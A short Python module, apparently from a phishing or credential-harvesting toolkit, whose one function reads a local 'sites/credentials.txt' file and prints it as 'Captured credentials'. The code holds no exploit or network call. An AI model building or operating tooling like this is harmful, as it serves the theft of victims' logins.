import os

CRED_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), "sites", "credentials.txt")

def show_credentials():
    print("Captured credentials:")
    if not os.path.exists(CRED_PATH):
        print("No credentials have been captured yet.")
        return
    with open(CRED_PATH, "r") as f:
        creds = f.read()
        print(creds if creds else "(empty)")
